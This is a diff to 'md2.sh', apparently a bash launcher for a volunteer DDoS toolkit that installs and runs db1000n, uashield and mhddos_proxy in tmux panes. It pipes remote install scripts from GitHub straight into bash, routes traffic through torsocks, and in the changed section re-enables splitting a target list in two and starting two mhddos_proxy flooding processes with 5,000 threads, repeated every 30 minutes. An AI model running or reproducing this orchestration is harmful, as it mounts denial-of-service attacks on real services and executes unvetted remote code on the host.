@@ -1,6 +1,6 @@
 #!/bin/bash
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v0.5h\n"
+clear && echo -e "Loading... v0.5i\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -77,27 +77,26 @@ if [[ $gotop == "on" ]]; then
         sudo dpkg -i gotop.deb
     fi
     tmux new-session -s multiddos -d 'gotop -sc solarized'
-    sleep 0.2
+    # sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
 else
-    sleep 0.2
+    # sleep 0.2
     tmux new-session -s multiddos -d 'bash auto_bash.sh'
 fi
 
 if [[ $vnstat == "on" ]]; then
     sudo apt -yq install vnstat
-    sleep 0.2
+    # sleep 0.2
     tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
     sudo apt -yq install torsocks
-    sleep 0.2
+    # sleep 0.2
     tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 fi
 
 if [[ $uashield == "on" ]]; then
-    sleep 0.2
     tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
@@ -105,16 +104,13 @@ if [[ $proxy_finder == "on" ]]; then
     #sleep 0.2
     tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo -e "\x1b[32mШукаю проксі, в середньому одна робоча знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py  --threads $proxy_threads'
 fi
-
-
 tmux attach-session -t multidd
 #tmux a
-
 }
 
 #if [[ "$1" = ""  ]]; then launch; fi
-
 #args_to_pass=""
+
 while [ "$1" != "" ]; do
     case $1 in
         +d | --db1000n )   db1000n="on"; shift ;;
@@ -151,11 +147,10 @@ while true; do
         tail -n 2000 $targets_uniq > $targets_lite
         python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
     else
-        echo "5555555555"; sleep 5
-        # cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
-        # python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $args_to_pass &
-        # sleep 5 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $args_to_pass &
+        cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $args_to_pass &
+        sleep 5 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $args_to_pass &
     fi
 sleep 30m
 prepare_targets_and_banner
